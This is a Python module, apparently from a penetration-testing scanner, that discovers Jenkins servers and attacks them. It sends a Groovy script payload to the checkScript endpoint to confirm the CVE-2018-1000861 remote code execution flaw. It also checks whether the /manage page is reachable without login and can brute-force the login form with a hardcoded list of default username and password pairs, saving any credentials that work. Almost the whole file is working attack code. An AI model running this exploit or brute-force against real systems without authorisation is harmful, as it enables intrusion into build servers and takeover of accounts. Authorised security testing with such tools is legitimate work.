import os.path

from utils.output import Output
from utils.db import DB
from utils.utils import gen_random_string, gen_bruteforce_creds
from lib.httpscan.http import HTTP

creds = [
    "admin:jenkins",
    "admin:admin",
    "jenkins:jenkins",
    "jenkins:admin",
    "jenkins:root",
    "root:root",
    "root:jenkins",
]

jenkins_urls = [
    '',
    'jenkins'
]

class Module:
    name = 'Jenkins'
    description = 'Discover and exploit Jenkins (default password, CVE-2018-1000861)'

    def run(self, target, args, useragent, proxy, timeout):
        http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)

        # Checking CVE-2018-1000861
        exploit_url = os.path.join(target['path'], 'securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript')
        payload = {
            'sandbox': 'true',
            'value': """public class x {
  public x(){
    "echo test".execute()
  }
}""",
        }
        res = http.get(exploit_url, params=payload)
        if res['code'] in [200] and 'jetty' in res['server'].lower():
            Output.write({'target': http.url(target['path']), 'message': 'Jenkins RCE (CVE-2018-1000861)'})

            vuln_info = {
                'hostname': target['hostname'],
                'port': target['port'],
                'service': 'http',
                'url': http.url(target['path']),
                'name': 'Jenkins RCE (CVE-2018-1000861)',
                'description': 'Jenkins application %s is vulnerable to RCE (CVE-2018-1000861)' % http.url(target['path']),
            }
            DB.insert_vulnerability(vuln_info)

        for url in jenkins_urls:
            url = os.path.join(target['path'], url)

            res = http.get(url)

            if res['code'] in [200,403] and ('jenkins' in res['title'].lower() and not '/jenkins' in res['title'].lower() or 'X-Jenkins' in res['headers']):
                http_info = {
                    'hostname': target['hostname'],
                    'port': target['port'],
                    'protocol': 'tcp',
                    'service': 'http',
                    'url': http.url(url),
                    'http': {
                        'path': url,
                        'code': res['code'],
                        'server': res['server'],
                        'title': res['title'],
                        'content-type': res['content-type'],
                    },
                    'tags': ['jenkins']
                }
                DB.insert_http_url(http_info)

                res['message_type'] = 'http'
                res['target'] = http.url(url)
                Output.write(res)

                if 'X-Jenkins' in res['headers']:
                    version = res['headers']['X-jenkins']
                else:
                    version = 'Unknown'

                Output.write({'target': http.url(url), 'message': 'Jenkins application, version %s' % version})

                manage_url = os.path.join(url, 'manage')
                login_url = os.path.join(url, 'login')

                data = http.get(manage_url)

                if data['code'] in [200] and not "content='1;url=%s" % login_url in data['html']:
                    Output.write({'target': http.url(url), 'message': 'Jenkins application accessible without authentication'})

                    vuln_info = {
                        'hostname': target['hostname'],
                        'port': target['port'],
                        'service': 'http',
                        'url': http.url(url),
                        'name': 'Anonymous Jenkins access',
                        'description': 'Jenkins application %s is accessible without authentication' % http.url(url),
                    }
                    DB.insert_vulnerability(vuln_info)
                else:
                    if args['bruteforce']:
                        Output.write({'target': http.url(login_url), 'message': 'Starting bruteforce...'})
                        for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                            username, password = cred.split(':')

                            data = http.get(login_url)

                            if not data:
                                continue

                            form = None
                            for f in data['forms']:
                                if not 'name' in f:
                                    continue

                                if 'login' in f['name'].lower():
                                    form = f
                                    break

                            if not form:
                                continue

                            for arg in form['args']:
                                if 'username' in arg.lower():
                                    form['args'][arg] = username

                                if 'password' in arg.lower():
                                    form['args'][arg] = password

                            res = http.send_form(login_url, form, html=data['html'], cookies=data['cookies'])

                            after_auth_form = None
                            for f in res['forms']:
                                if not 'name' in f:
                                    continue

                                if 'login' in f['name'].lower():
                                    after_auth_form = f
                                    break

                            if after_auth_form != None:
                                continue

                            Output.write({'target': http.url(url), 'message': 'Authentication success to Jenkins with login %s and password %s' % (username, password)})

                            cred_info = {
                                'hostname': target['hostname'],
                                'port': target['port'],
                                'service': 'http',
                                'url': http.url(url),
                                'type': 'password',
                                'username': username,
                                'password': password,
                                'tags': ['jenkins'],
                            }
                            DB.insert_credential(cred_info)
